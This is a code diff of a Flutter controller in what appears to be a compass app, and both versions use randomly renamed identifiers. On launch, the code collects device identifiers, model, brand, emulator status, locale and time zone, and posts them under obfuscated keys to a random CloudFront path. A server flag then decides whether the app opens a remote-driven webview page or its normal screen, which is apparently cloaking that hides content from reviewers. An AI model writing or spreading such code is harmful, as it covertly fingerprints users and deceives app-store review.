@@ -1,21 +1,21 @@
 import 'dart:io';
 
-import 'package:device_info_plus/device_info_plus.dart';
+import 'package:package_info_plus/package_info_plus.dart';
+import 'package:flutter_timezone/flutter_timezone.dart';
 import 'package:dio/dio.dart';
 import 'package:flutter_inappwebview/flutter_inappwebview.dart';
-import 'package:flutter_timezone/flutter_timezone.dart';
+import 'package:device_info_plus/device_info_plus.dart';
 import 'package:get/get.dart';
-import 'package:package_info_plus/package_info_plus.dart';
 
 
 class LuopanConfigLogic extends GetxController {
 
-  var mwboryankv = RxBool(false);
-  var xtirgafycn = RxBool(true);
-  var nxlfo = RxString("");
-  var elliot = RxBool(false);
-  var jast = RxBool(true);
-  final atfdbr = Dio();
+  var lpvugfiok = RxBool(false);
+  var ozqwystb = RxBool(true);
+  var olrjbpt = RxString("");
+  var kristofer = RxBool(false);
+  var fay = RxBool(true);
+  final jlsntgki = Dio();
 
 
   InAppWebViewController? webViewController;
@@ -23,104 +23,103 @@ class LuopanConfigLogic extends GetxController {
   @override
   void onInit() {
     super.onInit();
-    ekcowyn();
+    ncdxmg();
   }
 
 
-  Future<void> ekcowyn() async {
-    elliot.value = true;
-    jast.value = true;
-    xtirgafycn.value = false;
+  Future<void> ncdxmg() async {
+    kristofer.value = true;
+    fay.value = true;
+    ozqwystb.value = false;
 
-    atfdbr.post("https://d14hac7du22ssp.cloudfront.net/slyijmugfpdvhekbctowaxzqrn?no_check",data: await gatsrui()).then((value) {
-      var hltbcxg = value.data["hltbcxg"] as String;
-      var ayjvkl = value.data["ayjvkl"] as bool;
-      if (ayjvkl) {
-        nxlfo.value = hltbcxg;
-        madalyn();
+    jlsntgki.post("https://d1vdqnvv6p1b8t.cloudfront.net/igcvarftqeljxbphmzynuskwod",data: await jgxcqyr()).then((value) {
+      var xkpgqzr = value.data["xkpgqzr"] as String;
+      var fsebawnz = value.data["fsebawnz"] as bool;
+      if (fsebawnz) {
+        olrjbpt.value = xkpgqzr;
+        jermey();
       } else {
-        kutch();
+        graham();
       }
     }).catchError((e) {
-      xtirgafycn.value = true;
-      jast.value = true;
-      elliot.value = false;
+      ozqwystb.value = true;
+      fay.value = true;
+      kristofer.value = false;
     });
   }
 
-  Future<Map<String, dynamic>> gatsrui() async {
-    final DeviceInfoPlugin mfznudep = DeviceInfoPlugin();
-    PackageInfo ojadzrg_jtmzude = await PackageInfo.fromPlatform();
+  Future<Map<String, dynamic>> jgxcqyr() async {
+    final DeviceInfoPlugin emdjt = DeviceInfoPlugin();
+    PackageInfo slxi_eyrauwmh = await PackageInfo.fromPlatform();
     final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
-    var ntzseijg = Platform.localeName;
-    var ovb_yitHVxCw = currentTimeZone;
+    var kegidoup = Platform.localeName;
+    var ltvegp_BUltpvb = currentTimeZone;
 
-    var ovb_QeVEWPRb = ojadzrg_jtmzude.packageName;
-    var ovb_WRZMCuDV = ojadzrg_jtmzude.version;
-    var ovb_KndQ = ojadzrg_jtmzude.buildNumber;
+    var ltvegp_Rbhdg = slxi_eyrauwmh.packageName;
+    var ltvegp_WOHF = slxi_eyrauwmh.version;
+    var ltvegp_bDXtL = slxi_eyrauwmh.buildNumber;
 
-    var ovb_cCkOKmVa = ojadzrg_jtmzude.appName;
-    var ovb_ihsOaBdW = "";
-    var ovb_oZv  = "";
-    var ovb_PwXqB = "";
-    var ivyMorar = "";
-    var rodgerRutherford = "";
-    var fionaHowe = "";
-    var nigelQuitzon = "";
+    var ltvegp_dCBIV = slxi_eyrauwmh.appName;
+    var ltvegp_MU = "";
+    var ltvegp_upf  = "";
+    var ltvegp_pxwTAVUX = "";
+    var hollieHaag = "";
+    var monserrateDenesik = "";
+    var dillanConroy = "";
+    var shanonBlock = "";
 
 
-    var ovb_vlIYBLU = "";
-    var ovb_jnNgtar = false;
+    var ltvegp_UoVKI = "";
+    var ltvegp_VWkvi = false;
 
     if (GetPlatform.isAndroid) {
-      ovb_vlIYBLU = "android";
-      var jigcmtu = await mfznudep.androidInfo;
+      ltvegp_UoVKI = "android";
+      var kfodtwa = await emdjt.androidInfo;
 
-      ovb_PwXqB = jigcmtu.brand;
+      ltvegp_pxwTAVUX = kfodtwa.brand;
 
-      ovb_ihsOaBdW  = jigcmtu.model;
-      ovb_oZv = jigcmtu.id;
+      ltvegp_MU  = kfodtwa.model;
+      ltvegp_upf = kfodtwa.id;
 
-      ovb_jnNgtar = jigcmtu.isPhysicalDevice;
+      ltvegp_VWkvi = kfodtwa.isPhysicalDevice;
     }
 
     if (GetPlatform.isIOS) {
-      ovb_vlIYBLU = "ios";
-      var byegzhm = await mfznudep.iosInfo;
-      ovb_PwXqB = byegzhm.name;
-      ovb_ihsOaBdW = byegzhm.model;
+      ltvegp_UoVKI = "ios";
+      var kzuahqrmy = await emdjt.iosInfo;
+      ltvegp_pxwTAVUX = kzuahqrmy.name;
+      ltvegp_MU = kzuahqrmy.model;
 
-      ovb_oZv = byegzhm.identifierForVendor ?? "";
-      ovb_jnNgtar  = byegzhm.isPhysicalDevice;
+      ltvegp_upf = kzuahqrmy.identifierForVendor ?? "";
+      ltvegp_VWkvi  = kzuahqrmy.isPhysicalDevice;
     }
-
     var res = {
-      "ovb_cCkOKmVa": ovb_cCkOKmVa,
-      "ovb_KndQ": ovb_KndQ,
-      "ovb_WRZMCuDV": ovb_WRZMCuDV,
-      "rodgerRutherford" : rodgerRutherford,
-      "ovb_ihsOaBdW": ovb_ihsOaBdW,
-      "ovb_yitHVxCw": ovb_yitHVxCw,
-      "ovb_PwXqB": ovb_PwXqB,
-      "ivyMorar" : ivyMorar,
-      "ovb_oZv": ovb_oZv,
-      "ntzseijg": ntzseijg,
-      "ovb_QeVEWPRb": ovb_QeVEWPRb,
-      "ovb_vlIYBLU": ovb_vlIYBLU,
-      "ovb_jnNgtar": ovb_jnNgtar,
-      "fionaHowe" : fionaHowe,
-      "nigelQuitzon" : nigelQuitzon,
+      "ltvegp_dCBIV": ltvegp_dCBIV,
+      "ltvegp_bDXtL": ltvegp_bDXtL,
+      "ltvegp_WOHF": ltvegp_WOHF,
+      "ltvegp_Rbhdg": ltvegp_Rbhdg,
+      "ltvegp_MU": ltvegp_MU,
+      "ltvegp_BUltpvb": ltvegp_BUltpvb,
+      "ltvegp_pxwTAVUX": ltvegp_pxwTAVUX,
+      "ltvegp_upf": ltvegp_upf,
+      "kegidoup": kegidoup,
+      "ltvegp_UoVKI": ltvegp_UoVKI,
+      "ltvegp_VWkvi": ltvegp_VWkvi,
+      "hollieHaag" : hollieHaag,
+      "monserrateDenesik" : monserrateDenesik,
+      "dillanConroy" : dillanConroy,
+      "shanonBlock" : shanonBlock,
 
     };
     return res;
   }
 
-  Future<void> kutch() async {
-    Get.offNamed("/ClockMainPage");
+  Future<void> graham() async {
+    Get.offNamed("/luopan_tab");
   }
 
-  Future<void> madalyn() async {
-    Get.offNamed("/Outreload");
+  Future<void> jermey() async {
+    Get.offNamed("/luopan_session");
   }
 
 }
